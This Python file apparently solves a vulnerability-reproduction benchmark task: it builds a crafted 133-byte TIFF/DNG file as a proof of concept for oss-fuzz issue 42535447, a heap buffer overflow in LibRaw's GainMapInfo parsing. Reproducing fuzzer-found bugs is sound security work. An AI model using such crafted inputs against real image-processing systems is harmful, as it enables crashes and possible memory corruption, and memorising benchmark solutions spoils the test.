import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PoC for oss-fuzz:42535447 (LibRaw Heap Buffer Overflow in decodeGainmapMetadata)
        # The vulnerability is an unsigned integer underflow when parsing the GainMapInfo tag.
        
        # 1. TIFF Header (Little Endian)
        # Magic: 'II' (0x4949), Version: 42 (0x002A), IFD Offset: 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # 2. IFD Entry Count: 1
        num_entries = struct.pack('<H', 1)
        
        # 3. Tag Entry: GainMapInfo (0xC7B5)
        # ID: 0xC7B5 (DNG 1.7 GainMapInfo)
        # Type: 1 (BYTE)
        # Count: 107
        #   Total file size target: 133 bytes
        #   Header (8) + IFD Count (2) + Tag (12) + Next IFD (4) = 26 bytes
        #   Payload = 133 - 26 = 107 bytes
        # Offset: 26 (Data follows immediately after IFD structure)
        tag_id = 0xC7B5
        tag_type = 1
        count = 107
        offset = 26
        tag = struct.pack('<HHII', tag_id, tag_type, count, offset)
        
        # 4. Next IFD Offset: 0 (Null)
        next_ifd = struct.pack('<I', 0)
        
        # 5. Payload
        # The vulnerability is a subtraction between unsigned types (e.g., len - header_size).
        # Providing a payload of zeros causes read lengths to be 0, triggering underflow 
        # when a constant or header size is subtracted from it.
        payload = b'\x00' * count
        
        return header + num_entries + tag + next_ifd + payload
